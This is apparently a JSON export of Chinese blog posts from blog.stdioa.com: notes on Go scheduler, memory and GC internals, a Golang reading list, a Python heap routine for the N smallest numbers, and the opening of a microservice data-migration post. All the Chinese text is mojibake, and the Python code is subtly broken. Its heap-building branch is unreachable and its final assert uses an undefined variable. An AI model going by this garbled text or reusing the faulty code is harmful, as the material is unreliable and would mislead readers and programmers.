éƒ½æ˜¯ goroutineï¼Œè¿™ä¸ªä»»åŠ¡çš„åœ°ä½æ˜¯é«˜äº GC çš„ã€‚ è°ƒåº¦æ¨¡å‹ Go å¦‚ä½•å®ç°å¹¶å‘ï¼ŸGo é€šè¿‡ goroutine å’Œ channel æ¥å®ç° CSP å¹¶å‘æ¨¡å‹ï¼Œä»è€Œå®ç°å¹¶å‘ã€‚goroutine æ˜¯ Go è¯­è¨€ä¸­å¹¶å‘çš„æ‰§è¡Œå•ä½ã€‚å¯ä»¥ç†è§£ä¸ºè½»é‡çº§çš„â€œçº¿ç¨‹â€ã€‚channel æ˜¯ Go è¯­è¨€ä¸­å„ä¸ªå¹¶å‘ç»“æ„ä½“ (goroutine) ä¹‹å‰çš„é€šä¿¡æœºåˆ¶ã€‚ é€šä¿—çš„è®²ï¼Œå°±æ˜¯å„ä¸ª goroutine ä¹‹é—´é€šä¿¡çš„â€œç®¡é“â€ï¼Œæœ‰ç‚¹ç±»ä¼¼äº Linux ä¸­çš„ç®¡é“ã€‚å†æ·±å…¥ä¸€ç‚¹ï¼ŒGo çº¿ç¨‹æ¨¡å‹çš„å®ç°ä¾é  MPG ä»¥åŠ Sched ç»“æ„ä½“ã€‚M æ˜¯ Machineï¼Œæ˜¯å¯¹æœºå™¨çš„æŠ½è±¡ï¼Œä¸€ä¸ª M ä¼šå…³è”ä¸€ä¸ªç‰©ç†çº¿ç¨‹ï¼›P æ˜¯ Processorï¼Œä»£è¡¨ Go ä»£ç æ‰§è¡Œæ˜¯æ‰€éœ€è¦çš„èµ„æºï¼›G æ˜¯ Goroutineï¼Œä»£è¡¨ Goroutine çš„æ§åˆ¶ç»“æ„ï¼›Sched æ˜¯è°ƒåº¦å®ç°ä¸­ä½¿ç”¨çš„æ•°æ®ç»“æ„ã€‚å¤šä¸ª G ä¼šä»¥é˜Ÿåˆ—çš„å½¢å¼æŒ‚é åœ¨ P ä¸Šï¼›å½“ G ä¸ M ç»‘å®šæ—¶ï¼Œæ‰èƒ½å¤Ÿæ‰§è¡Œ Go ä»£ç ã€‚è°ƒåº¦æ—¶ä¼šé‡‡ç”¨æŠ¢å å¼è°ƒåº¦æ¨¡å‹ä»¥é¿å…ä¸€ä¸ª goroutine è¿è¡Œå¤ªé•¿æ—¶é—´ï¼›æŸä¸ª P çš„é˜Ÿåˆ—å˜ç©ºæ—¶ä¼šä»å…¶å®ƒçš„ P é˜Ÿåˆ—ä¸Šå· Gï¼Œç„¶åç»§ç»­è¿è¡Œã€‚http://morsmachine.dk/go-scheduler ç³»ç»Ÿè°ƒç”¨ç»†èŠ‚å½“æŸä¸ª goroutine å‘èµ·ä¸€æ¬¡ç³»ç»Ÿè°ƒç”¨æ—¶ï¼Œä¼šè°ƒç”¨ runtime.entersyscallã€‚è°ƒåº¦å™¨ä¼šå°† G çš„çŠ¶æ€è®¾ç½®ä¸º Gsyscall åæ”¾å…¥å°±ç»ªé˜Ÿåˆ—ï¼›æ­¤æ—¶ï¼Œp ä¼šå’Œ m è¿›è¡Œå‰¥ç¦»ï¼Œp çš„çŠ¶æ€è¢«è®¾ä¸º Psyscallï¼Œè€Œ m ä¼šå»æ‰§è¡Œç³»ç»Ÿè°ƒç”¨ã€‚å¦‚æœç³»ç»Ÿè°ƒç”¨æ—¶éé˜»å¡çš„ï¼Œé‚£ä¹ˆ m ä¼šå¾ˆå¿«è¿”å›ã€‚è¿”å›æ—¶ä¼šè°ƒç”¨ runtime.exitsyscallï¼Œè¿™ä¸ªæ—¶å€™ä¼šå»æ£€æŸ¥å½“å‰ m çš„ Pï¼Œå¦‚æœ P å¤„äº Psyscall ä¸”é˜Ÿåˆ—éç©ºï¼Œåˆ™é‡æ–°å°† p å’Œ m ç»‘å®šï¼Œæ¢å¤ g çš„çŠ¶æ€ä¸º Grunningï¼Œç»§ç»­è¿è¡Œã€‚å¦‚æœ goroutine å‘èµ·çš„æ˜¯é˜»å¡çš„ç³»ç»Ÿè°ƒç”¨ï¼Œåˆ™ä¼šè°ƒç”¨ runtime.entersyscallblockã€‚ä¸ entersyscall ä¸åŒçš„æ˜¯ï¼Œentersyscallblock ä¼šè°ƒç”¨ releasep å’Œ handoffpã€‚releasep å°†å½“å‰çš„ M ä¸ M å…³è”çš„ P å‰¥ç¦»ï¼ŒM ä¼šè´Ÿè´£å»æ‰§è¡Œç³»ç»Ÿè°ƒç”¨ï¼›æ‰§è¡Œ handoffp ä¼šè®© P å°è¯•æŒ‚é åˆ°å…¶å®ƒç©ºé—²çš„ M ä¸Šç»§ç»­æ‰§è¡Œã€‚å¦‚æœ P ä¸Šæ²¡æœ‰ G äº†ï¼ŒP ä¼šè¢«è®¾ç½®ä¸º Pidleï¼›å¦‚æœæ²¡æœ‰ç©ºé—²çš„ M äº†ï¼Œåˆ™ä¼šè°ƒç”¨ startm æ¥è®© P ä¸æ–°çš„ M ç»‘å®šåç»§ç»­æ‰§è¡Œã€‚å½“ç³»ç»Ÿè°ƒç”¨å®Œæˆæ—¶ï¼Œè¦è®©å‘èµ·è°ƒç”¨çš„ G æ¥ç»§ç»­æ‰§è¡Œã€‚è¿™æ—¶ G ä¼šå»æ‰¾å¯ç”¨çš„ Pã€‚å¦‚æœå½“å‰ä¸å­˜åœ¨ Pidle çš„ Pï¼Œè°ƒåº¦å™¨å°†ä¼šæŠŠ G å˜æˆ Grunnableï¼Œå°†å®ƒæŒ‚åˆ°å…¨å±€çš„å°±ç»ª G é˜Ÿåˆ—ä¸­ï¼Œç„¶ååœæ­¢å½“å‰ m å¹¶è°ƒç”¨ schedule å‡½æ•°ã€‚æ¢å¥è¯è¯´ï¼Œblock çš„æ—¶å€™ï¼Œå¯èƒ½ m ä¸Šçš„ P ä¼šç©ºé—²ï¼Œç­‰ m è¿”å›åè¿˜å¯ä»¥ç»§ç»­æŒ‚è½½æ‰§è¡Œï¼Œæ­¤æ—¶ M-P-G çš„ç»‘å®šåŸæ ·æ¢å¤ã€‚æ•´ä¸ªé€»è¾‘å°±æœ‰ç‚¹åƒéé˜»å¡è°ƒç”¨ã€‚å¦‚æœ m ä¸Šçš„ P å»å¹²åˆ«çš„äº†ï¼ˆæ¯”å¦‚åˆæ‰¾äº†ä¸ªæ–°çš„ M ç»§ç»­æ‰§è¡Œï¼‰ï¼Œé‚£ä¹ˆå½“å‰ m ä¼šå°†ä¿¡æ¯ä¼ é€’ç»™ Gï¼Œæ”¹å˜ G çš„çŠ¶æ€ï¼Œç„¶å m è‡ªå·±é€€å‡ºï¼ˆå› ä¸ºæ‰€æœ‰çš„ P éƒ½æœ‰ M äº†ï¼‰ å†…å­˜ç®¡ç† å†…å­˜æ± æ¯ä¸ªçº¿ç¨‹éƒ½ä¼šæœ‰è‡ªå·±çš„æœ¬åœ°å†…å­˜ï¼Œå½“çº¿ç¨‹å†…å­˜ä¸å¤Ÿæ—¶ä¼šå‘å…¨å±€åˆ†é…é“¾ä¸­ç”³è¯·å†…å­˜ã€‚Go ä¼šä¸ºæ¯ä¸ª M åœ¨ MCache ä¸­å­˜å‚¨ä¸€äº›ç©ºé—²çš„å°å†…å­˜å—ï¼›ä½œä¸ºå¤‡ç”¨åˆ†é…å­˜å‚¨ã€‚å½“ MCache ç”¨å®Œåï¼Œä¼šä» MCentral è‡ªç”±é“¾æ‹¿ä¸€äº›å¯¹è±¡è¿›è¡Œè¡¥å……ï¼›MCentral ä¸ºç©ºæ—¶ï¼Œåˆä¼šä» Mheap ä¸­æ‹¿ä¸€äº›å¯¹è±¡è¿›è¡Œè¡¥å……ã€‚è¿™æ ·çš„å¤šçº§æ‰¹é‡è¡¥å……æœºåˆ¶å‡å°äº†å…¨å±€å†…å­˜åŠ é”çš„å¼€é”€ã€‚å½“ç¨‹åºéœ€è¦å°å¯¹è±¡ï¼ˆå°äº 32Kï¼‰æ—¶ï¼Œä¼šç›´æ¥ä» MCache ä¸­åˆ†é…ï¼Œå¯¹è±¡è¢«å›æ”¶åæ§åˆ¶å†…å­˜è¿”å›ç»™å…¨å±€æ§åˆ¶å †ï¼ˆMHeapï¼‰ï¼›ä» MCache ä¸­åˆ†é…é¿å…äº†åœ¨å…¨å±€æ§åˆ¶å †ä¸Šé¢‘ç¹åŠ é”ã€‚å½“éœ€è¦å¤§å¯¹è±¡æ—¶ï¼Œä¼šç›´æ¥ä»å…¨å±€æ§åˆ¶å †ä¸Šä»¥é¡µï¼ˆ4KBï¼‰ä¸ºå•ä½è¿›è¡Œåˆ†é…ã€‚å› æ­¤å¤§å¯¹è±¡æ€»æ˜¯é¡µå¯¹é½çš„ã€‚ åƒåœ¾å›æ”¶Go è¯­è¨€ä½¿ç”¨æ ‡è®°æ¸…é™¤ç®—æ³•æ¥å®Œæˆåƒåœ¾å›æ”¶ï¼Œæ•´ä¸ªå›æ”¶è¿‡ç¨‹ä¼š stop the world.æ ‡è®°é˜¶æ®µä» root åŒºåŸŸå‡ºå‘ï¼Œæ‰«ææ‰€æœ‰ç›´æ¥æˆ–é—´æ¥å¼•ç”¨çš„å¯¹è±¡ï¼›æ¸…é™¤é˜¶æ®µç›´æ¥æ‰«æå †åŒºï¼Œå¯¹æœªè¢«æ ‡è®°çš„å¯¹è±¡è¿›è¡Œå›æ”¶ã€‚ç”±äºæ ‡è®°è¿‡ç¨‹æ˜¯ä¸€ä¸ªæ ‘å½¢çš„æ“ä½œï¼Œæ‰€ä»¥è¿™ä¸ªè¿‡ç¨‹è¢«å¹¶è¡ŒåŒ–ï¼Œä»¥æå‡é€Ÿåº¦ã€‚ ç½‘ç»œGo é€šè¿‡è¿è¡Œæ—¶å±‚é¢å¯¹ epoll/kqueue çš„å°è£…æ¥å®ç°éé˜»å¡ io.å°è£…å±‚æ¬¡ï¼šå¹³å°ç›¸å…³çš„ API å°è£…å¹³å°ç‹¬ç«‹çš„ runtime å°è£…ç”¨æˆ·çº§åˆ«çš„åº“å°è£…ï¼ˆå¦‚ netï¼‰åœ¨ runtime.main å¯åŠ¨æ—¶ï¼Œä¼šè¿è¡Œ newm(sysmon, nil)ï¼Œè€Œ sysmon å°±ä¼šæ¯éš”ä¸€æ®µæ—¶é—´æ‰§è¡Œ runtime.epollã€‚sysmon çš„åœ°ä½è¦æ¯” gc é‡è¦çš„å¤šï¼Œè€Œä¸”ä¼šé¢‘ç¹æ‰§è¡Œï¼Œæ‰€ä»¥ä¼šå•ç‹¬ä¸ºå®ƒåˆ†é…ä¸€ä¸ªç³»ç»Ÿçº¿ç¨‹ï¼ˆmï¼‰æ¥è¿è¡Œã€‚","categories":[{"name":"Golang","slug":"Golang","permalink":"https://blog.stdioa.com/categories/Golang/"}],"tags":[{"name":"Golang","slug":"Golang","permalink":"https://blog.stdioa.com/tags/Golang/"}]},{"title":"Golang å­¦ä¹ è®°å½•","slug":"golang-learning-experience","date":"2019-06-19T07:27:00.000Z","updated":"2019-06-24T08:25:39.018Z","comments":true,"path":"2019/06/golang-learning-experience/","link":"","permalink":"https://blog.stdioa.com/2019/06/golang-learning-experience/","excerpt":"è¿™å‡ ä¸ªæœˆåœ¨è€ƒè™‘ä» Python è½¬å‘ Golangï¼Œæ‰€ä»¥ä¸“é—¨å­¦ä¹ äº† Golang.è¿™é‡Œæ˜¯ Golang å­¦ä¹ çš„ä¸€äº›è®°å½•ã€‚","text":"è¿™å‡ ä¸ªæœˆåœ¨è€ƒè™‘ä» Python è½¬å‘ Golangï¼Œæ‰€ä»¥ä¸“é—¨å­¦ä¹ äº† Golang.è¿™é‡Œæ˜¯ Golang å­¦ä¹ çš„ä¸€äº›è®°å½•ã€‚å­¦ä¹ ç¬”è®°ç¨åå†æ•´ç†ï¼ˆå’•ï¼‰ï¼Œå…ˆåˆ—ä¸€ä¸‹æˆ‘è¿™å‡ ä¸ªæœˆçœ‹è¿‡çš„å„ç§æ•™ç¨‹å§ã€‚ é˜…è¯»åˆ—è¡¨Go by ExampleGo by Example æ˜¯å¯¹ Go åŸºäºå®è·µçš„ä»‹ç»ï¼ŒåŒ…å«ä¸€ç³»åˆ—å¸¦æœ‰æ ‡æ³¨è¯´æ˜çš„ç¤ºä¾‹ç¨‹åºã€‚çœŸÂ·å¿«é€Ÿä¸Šæ‰‹å¿…å¤‡ã€‚ã€ŠGoè¯­è¨€å››åäºŒç« ç»ã€‹ã€ŠGoè¯­è¨€å››åäºŒç« ç»ã€‹è¯¦ç»†è®²è¿°äº†Goè¯­è¨€è§„èŒƒä¸è¯­æ³•ç»†èŠ‚ä»¥åŠåœ¨å¼€å‘ä¸­å¸¸è§çš„è¯¯åŒºï¼›é€šè¿‡å¯¹æ ‡å‡†åº“åŒ…å’Œè‘—åç¬¬ä¸‰æ–¹åŒ…çš„å®é™…è¿ç”¨ï¼Œæ¥å¯å‘è¯»è€…æ·±åˆ»ç†è§£Goè¯­è¨€çš„æ ¸å¿ƒæ€ç»´ï¼Œä»”ç»†ç¢ç£¨ç»å…¸ä»£ç è®¾è®¡æ¨¡å¼ï¼Œå¼•é¢†è¯»è€…è¿›å…¥Goè¯­è¨€å¼€å‘çš„æ›´é«˜é˜¶æ®µã€‚è®²è§£è¯¦ç»†ã€ä¿¡æ¯é‡è¶…å¤§çš„ Go è¯­è¨€æ•™ç¨‹ã€‚Go Tourç»å…¸çš„ Golang å®˜æ–¹æ•™ç¨‹ã€‚ä¸Šå¤§å­¦çš„æ—¶å€™å•ƒè¿‡è‹±æ–‡çš„ Go Tourï¼Œä½†æ˜¯æ²¡å•ƒå®Œã€‚çœ‹å®Œã€ŠGo è¯­è¨€å››åäºŒç« ç»ã€‹ä»¥åï¼Œæˆ‘åªç”¨äº†ä¸€ä¸ªåŠå°æ—¶å°±æŠŠæ•´å¥—æ•™ç¨‹åˆ·å®Œäº†ã€‚Go-Megaä½œè€…æ¨¡ä»¿ The Flask Mega-Tutorial å†™çš„ Go è¯­è¨€ MVC å¼€å‘æ•™ç¨‹ï¼Œä½¿ç”¨è£¸ http åŒ…æ¥è¿›è¡Œ Web å¼€å‘ã€‚ã€ŠGo è¯­è¨€åœ£ç»ã€‹ä¹Ÿæ˜¯ç»å…¸æ•™ç¨‹äº†ã€‚ä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œä¹¦çš„å†…å®¹è®©æˆ‘æ„Ÿè§‰ç¨å¾®æœ‰ç‚¹ç‚¹æ™¦æ¶©ã€‚å¤§æ¦‚è¿™ä¸ªæ—¶å€™è¢«æ¨èäº†ä¸€ä¸ªå« Exercism çš„ç½‘ç«™ï¼Œä¸Šé¢æœ‰ä¸€äº›æœ‰è¶£ï¼ˆæˆ–é¬¼ç•œï¼‰çš„é¢˜ç›®å¯ä»¥ç”¨æ¥ç»ƒä¹ ç¼–ç ç†Ÿç»ƒåº¦ã€‚ä¸¤å¤©å®Œæˆäº†å¤§æ¦‚ä¸‰åˆ†ä¹‹ä¸€çš„é¢˜ç›®ï¼Œç„¶åå°±æç½®åœ¨ä¸€è¾¹äº†ã€‚ä»£ç åœ¨è¿™é‡Œã€‚ã€ŠGo è¯­è¨€æ ‡å‡†åº“ã€‹Golangæ ‡å‡†åº“ã€‚å¯¹äºç¨‹åºå‘˜è€Œè¨€ï¼Œæ ‡å‡†åº“ä¸è¯­è¨€æœ¬èº«åŒæ ·é‡è¦ï¼Œå®ƒå¥½æ¯”ä¸€ä¸ªç™¾å®ç®±ï¼Œèƒ½ä¸ºå„ç§å¸¸è§çš„ä»»åŠ¡æä¾›å®Œç¾çš„è§£å†³æ–¹æ¡ˆã€‚ä»¥ç¤ºä¾‹é©±åŠ¨çš„æ–¹å¼è®²è§£Golangçš„æ ‡å‡†åº“ã€‚å†™çš„å¾ˆæ£’ï¼Œæ—¥åä¹Ÿå¯ä»¥åšå·¥å…·ä¹¦æ¥æŸ¥è¯¢æ ‡å‡†åº“ç”¨æ³•ã€‚åªä¸è¿‡è¿™æœ¬ä¹¦æ²¡æœ‰å†™å®Œï¼Œæœ‰ç‚¹å¯æƒœã€‚ã€ŠGo è¯­è¨€é«˜çº§ç¼–ç¨‹ã€‹ã€ŠGoè¯­è¨€é«˜çº§ç¼–ç¨‹ã€‹å¼€æºå›¾ä¹¦ï¼Œæ¶µç›–CGOã€Goæ±‡ç¼–è¯­è¨€ã€RPCå®ç°ã€Protobufæ’ä»¶å®ç°ã€Webæ¡†æ¶å®ç°ã€åˆ†å¸ƒå¼ç³»ç»Ÿç­‰é«˜é˜¶ä¸»é¢˜(å®Œç¨¿)æˆ‘çœ‹çš„æ—¶å€™è·³è¿‡äº† CGO å’Œæ±‡ç¼–çš„éƒ¨åˆ†ã€‚å†…å®¹â€¦Emmmmâ€¦æœ‰ç‚¹æ‚ã€‚æ¯”å¦‚åˆ†å¸ƒå¼ç³»ç»Ÿç« èŠ‚çš„å¤§éƒ¨åˆ†å†…å®¹å¹¶ä¸æ˜¯åœ¨è®² Goï¼Œè€Œæ˜¯åœ¨è®²åç«¯çš„è§£å†³æ–¹æ¡ˆã€æŠ€æœ¯é€‰å‹ï¼Œä»¥åŠå„ç§æˆç†Ÿäº§å“çš„ä½¿ç”¨ã€‚ä¸è¿‡è¿˜æ˜¯å€¼å¾—ä¸€çœ‹ã€‚çœ‹å®Œè¿™äº›ä»¥åï¼Œæˆ‘ç”¨äº†ä¸¤å¤©æ—¶é—´ï¼Œä½¿ç”¨ gin é‡æ–°å®ç°äº†å¤§ä¸‰çš„æ—¶å€™å†™çš„è¿·ä½ åšå®¢çš„åç«¯éƒ¨åˆ†ï¼Œåªä¸è¿‡æ­¤æ—¶ Go-Mega çš„å†…å®¹å·²ç»å¿˜è®°äº†ä¸å°‘ï¼Œæ‰€ä»¥ MVC çš„æ¨¡å¼å¯èƒ½å®ç°çš„ä¸å¤Ÿè§„èŒƒã€‚ä»£ç åœ¨è¿™ã€‚ã€ŠGo Web ç¼–ç¨‹ã€‹è¿™æœ¬ä¹¦æœ‰ç‚¹è€äº†ï¼Œå†…å®¹ä¹Ÿæ¯”è¾ƒç®€å•ï¼Œå¤§æ¦‚ç¿»äº†ç¿»ï¼Œä¸åˆ°ä¿©å°æ—¶å°±çœ‹å®Œäº†ã€‚ã€Šæ·±å…¥è§£æ Goã€‹æ·±å…¥è®²äº† Go è¯­è¨€çš„å†…éƒ¨å®ç°ï¼Œåº”è¯¥å¯¹ç†è§£ Go åº•å±‚ä¼šæœ‰å¾ˆå¤§å¸®åŠ©ã€‚è¿™æœ¬ä¹¦åˆšå¼€å§‹çœ‹ã€‚ä¹¦ä¸­çš„ Go è¯­è¨€ç‰ˆæœ¬è¾ƒè€ï¼Œä¸€äº›åº•å±‚æ•°æ®ç»“æ„çš„é€»è¾‘æ˜¯ç”¨ C å®ç°çš„ï¼›è€Œ Go è¯­è¨€ä» 1.5 ç‰ˆæœ¬ä»¥åå°±å®ç°äº†è‡ªä¸¾ï¼Œè€Œæˆ‘çš„æ‰‹ä¸Šçš„ä»£ç æ˜¯ Go 1.12.5ï¼Œæ‰€ä»¥åœ¨ç¿»çœ‹ä»£ç æ—¶å¯èƒ½ä¼šå‘ç°ä¸€äº›å®ç°ä¸Šçš„ç»†å°å·®åˆ«ã€‚æ­¤å¤–ï¼Œé€‚åˆå…¥é—¨çš„ä¹¦ç±è¿˜æœ‰ã€ŠGo å…¥é—¨æŒ‡å—ã€‹ï¼Œä¸è¿‡ä¸ªäººæ›´æ¨èä½¿ç”¨ã€ŠGoè¯­è¨€å››åäºŒç« ç»ã€‹æ¥å…¥é—¨ã€‚å†æ¨èä¸€ä½å¤§ä½¬çš„åšå®¢ï¼Œä»–å¯¹ Go è¯­è¨€çš„ä¸€äº›åº•å±‚ç»†èŠ‚åšäº†æ·±å…¥çš„åˆ†æå’Œæ˜“æ‡‚çš„è®²è§£ã€‚https://halfrost.com/tag/go/ å­¦ä¹ ç¬”è®°ã€Šæ·±å…¥è§£æ Goã€‹ç¬”è®°ï¼Œä¹¦è®²çš„å¾ˆæ·±å…¥ï¼Œæˆ‘è®°å¾—ä¸å¤Ÿæ·±å…¥ã€‚åŸºç¡€å†…å®¹çš„ç¬”è®°ç¨åå¥‰ä¸Šï¼ˆå¤§æ¦‚å§ï¼‰ã€‚","categories":[{"name":"Golang","slug":"Golang","permalink":"https://blog.stdioa.com/categories/Golang/"}],"tags":[{"name":"Golang","slug":"Golang","permalink":"https://blog.stdioa.com/tags/Golang/"}]},{"title":"ç”¨å †æ‰¾å‡ºæœ€å°çš„ N ä¸ªæ•°","slug":"find-minn-with-heap","date":"2019-05-21T08:26:34.000Z","updated":"2019-05-21T08:46:12.680Z","comments":true,"path":"2019/05/find-minn-with-heap/","link":"","permalink":"https://blog.stdioa.com/2019/05/find-minn-with-heap/","excerpt":"ä¸çŸ¥é“ä¸ºå•¥ï¼Œçªç„¶æƒ³æ°´ä¸€ç¯‡å¾ˆæ°´çš„ç®—æ³•æ–‡ç« ã€‚","text":"ä¸çŸ¥é“ä¸ºå•¥ï¼Œçªç„¶æƒ³æ°´ä¸€ç¯‡å¾ˆæ°´çš„ç®—æ³•æ–‡ç« ã€‚ä»Šå¤©æ•´ç† MySQL çš„ç¬”è®°ï¼Œçœ‹åˆ°äº†è¿™æ ·ä¸€å¥è¯ï¼šMySQL åœ¨æ‰§è¡Œ ORDER BY x LIMIT n è¿™ç±»è¯­å¥ï¼Œä¸” LIMIT çš„æ•°é‡æœ‰é™æ—¶ï¼ˆæ¯”å¦‚åªéœ€è¦ 3 æ¡æ•°æ®ï¼‰ï¼ŒMySQL ä¼šå°½é‡é€šè¿‡å †æ¥æ„å»ºä¼˜å…ˆé˜Ÿåˆ—ï¼Œå‡å°‘æ’åºæ‰€éœ€çš„æ—¶é—´ã€‚è¿™æ˜¯å †çš„ä¸€ä¸ªç»å…¸åº”ç”¨ï¼šä»æµ·é‡æ•°æ®ä¸­æ‰¾å‡ºæœ€å¤§ï¼ˆå°ï¼‰çš„ n ä¸ªæ•°ã€‚ä¹‹å‰åªç”¨å †å†™è¿‡å †æ’ï¼Œæ²¡æœ‰ç”¨å †å¤„ç†è¿‡åœ¨çº¿ç®—æ³•ï¼Œæ‰€ä»¥å°±å†™äº†å†™ã€‚ç”¨ä¸€å¥è¯æ¦‚æ‹¬è¿™ä¸ªç®—æ³•ï¼šè¦æ‰¾æœ€å°çš„æ•°ï¼Œå°±è¦æ„å»ºå¤§é¡¶å †ã€‚åœ¨å¤„ç†æ•°æ®æ—¶ï¼Œæˆ‘ä»¬ä¼šæ„å»ºä¸€ä¸ªå¤§é¡¶å † Hï¼Œé‚£ä¹ˆ H[0] çš„å€¼ä¹Ÿå°±æ˜¯å½“å‰æ•°æ®ä¸­æœ€å°çš„ N ä¸ªæ•°ä¸­çš„æœ€å¤§å€¼ï¼Œä¹Ÿå°±æ˜¯ç¬¬ N å°çš„æ•°ã€‚å½“å¤„ç†æ–°çš„æ•°æ—¶ï¼Œå¦‚æœè¿™ä¸ªæ•°å°äºå †é¡¶çš„æ•°ï¼Œé‚£ä¹ˆå°±æŠŠå®ƒå˜æˆå †é¡¶ï¼Œç„¶åå†å¯¹å †è¿›è¡Œç»´æŠ¤ï¼Œä»¥ä¿è¯æœ‰åºã€‚æ­¤ç®—æ³•çš„æ—¶é—´å¤æ‚åº¦ä¸º O(MlogN)ï¼Œç©ºé—´å¤æ‚åº¦ä¸º O(N)ã€‚å…¶ä¸­ï¼ŒM æ˜¯æµ·é‡æ•°æ®çš„æ•°é‡ï¼Œè€Œè¦æ±‚å‡ºçš„æœ€å°æ•°çš„æ•°é‡ã€‚æœ€åä¸Šä»£ç ï¼Œä½¿ç”¨ Python è¯­è¨€ç¼–å†™ã€‚1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556import randomclass HeapForMinN: \"\"\"æ±‚æœ€å°çš„ N ä¸ªæ•°\"\"\" def __init__(self, size): self.size = size self.heap = [] def add(self, num): if len(self.heap) &lt; self.size: # æ•°æ®å¤ªå°‘ self.heap.append(num) elif len(self.heap) + 1 == self.size: # æ•°æ®æ•°é‡å¤Ÿäº†ï¼Œæ„å»ºå † self.heap.append(num) self.build_heap() elif num &lt; self.heap[0]: # ä½¿ç”¨æ–°æ•°æ›¿æ¢å †é¡¶ self.heap[0] = num self.max_heapify(0) def build_heap(self): length = len(self.heap) for i in range((length + 1) // 2, -1, -1): self.max_heapify(i) def max_heapify(self, index): length = len(self.heap) while index &lt; length: maxi = index i1, i2 = index * 2 + 1, index * 2 + 2 if i1 &lt; length and self.heap[maxi] &lt; self.heap[i1]: maxi = i1 if i2 &lt; length and self.heap[maxi] &lt; self.heap[i2]: maxi = i2 if maxi == index: break self.heap[index], self.heap[maxi] = self.heap[maxi], self.heap[index] index = maxi def min_n(self): return self.heapif __name__ == \"__main__\": list_ = list(range(1, 10001)) * 2 random.shuffle(list_) N = 10 hn = HeapForMinN(N) for i in list_: hn.add(i) min_n = hn.min_n() print(min_n) # [5, 4, 5, 4, 3, 3, 1, 1, 2, 2] assert sorted(min_n) == sorted(list_)[:n]","categories":[{"name":"éšç¬”","slug":"éšç¬”","permalink":"https://blog.stdioa.com/categories/éšç¬”/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://blog.stdioa.com/tags/Python/"},{"name":"ç®—æ³•","slug":"ç®—æ³•","permalink":"https://blog.stdioa.com/tags/ç®—æ³•/"},{"name":"å †","slug":"å †","permalink":"https://blog.stdioa.com/tags/å †/"}]},{"title":"å¾®æœåŠ¡æ¶æ„ä¸‹çš„æ•°æ®è¿ç§»æŒ‡å—","slug":"data-migration-between-microservices","date":"2019-04-08T04:40:00.000Z","updated":"2019-04-09T07:50:37.525Z","comments":true,"path":"2019/04/data-migration-between-microservices/","link":"","permalink":"https://blog.stdioa.com/2019/04/data-migration-between-microservices/","excerpt":"åœ¨æ‰‡è´ï¼Œé™¤äº† CRUD ä»¥å¤–ï¼Œåšçš„æœ€å¤šçš„äº‹æƒ…å¤§æ¦‚ä¹Ÿå°±æ˜¯æ•°æ®è¿ç§»äº†ï¼Œä»¥è‡³äºåæ¥ç®€å•çš„æ•°æ®è¿ç§»å·¥ä½œéƒ½å˜æˆäº†ä¸€ç§æ¬ç –ã€‚ä»Šå¤©åŠ¨ç¬”å†™ä¸€å†™åœ¨æ‰‡è´åšæ•°æ®è¿ç§»çš„æ–¹æ³•ï¼Œä»¥åŠä¸€äº›éœ€è¦å…³æ³¨çš„ç‚¹ã€‚","text":"åœ¨æ‰‡è´ï¼Œé™¤äº† CRUD ä»¥å¤–ï¼Œåšçš„æœ€å¤šçš„äº‹æƒ…å¤§æ¦‚ä¹Ÿå°±æ˜¯æ•°æ®è¿ç§»äº†ï¼Œä»¥è‡³äºåæ¥ç®€å•çš„æ•°æ®è¿ç§»å·¥ä½œéƒ½å˜æˆäº†ä¸€ç§æ¬ç –ã€‚ä»Šå¤©åŠ¨ç¬”å†™ä¸€å†™åœ¨æ‰‡è´åšæ•°æ®è¿ç§»çš„æ–¹æ³•ï¼Œä»¥åŠä¸€äº›éœ€è¦å…³æ³¨çš„ç‚¹ã€‚ 0. ä¸ºä»€ä¹ˆè¦åšæ•°æ®è¿ç§»ï¼Ÿå‡ºäºæ¶æ„è°ƒæ•´ / ä¸šåŠ¡è°ƒæ•´ï¼Œæˆ‘ä»¬éœ€è¦æŠŠæŸä¸ªå¾®æœåŠ¡ä¸­çš„æ•°æ®äº¤ç»™å¦å¤–ä¸€ä¸ªå¾®æœåŠ¡å»ç®¡ç†ã€‚å› ä¸ºæ¯ä¸ªæœåŠ¡é€šå¸¸ä¼šæœ‰è‡ªå·±çš„æ•°æ®åº“ï¼Œè€Œä¸”åªä¼šè¿æ¥åˆ°è‡ªå·±çš„æ•°æ®åº“ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨è®©æ–°çš„æœåŠ¡æ¥ç®¡æ•°æ®ä¹‹å‰ï¼Œå°±è¦ä¿è¯å…¨éƒ¨æˆ–éƒ¨åˆ†æ•°æ®å·²ç»è¦åœ¨æ–°çš„æ•°æ®åº“ä¸­äº†ï¼Œè¿™æ ·ä¸šåŠ¡æ‰èƒ½å¤Ÿå¹³æ»‘è¿‡æ¸¡å¹¶åˆ‡æ¢ã€‚ 1. æ€ä¹ˆåšæ•°æ®è¿ç§»ï¼Ÿ 1.1 é™æ€æ•°æ®è¿ç§»æŠŠæ•°æ®ä» A æœåŠ¡è¿ç§»åˆ° B æœåŠ¡ä¸­ï¼Œæ‰€éœ€çš„æ­¥éª¤ï¼šæŠŠ A é‡Œçš„æ•°æ®éƒ½å–å‡ºæ¥æŠŠæ•°æ®å¡è¿› B é‡Œé¢æ²¡æœ‰äº†ï¼å°±è¿™ä¹ˆç®€å•ï¼Œæ¯”â€œæŠŠå¤§è±¡æ”¾è¿›å†°ç®±â€è¿˜å°‘ä¸€æ­¥~ğŸŒæ‰€ä»¥æœ¬æ–‡åˆ°æ­¤ç»“æŸï¼Œé´é´ä½ 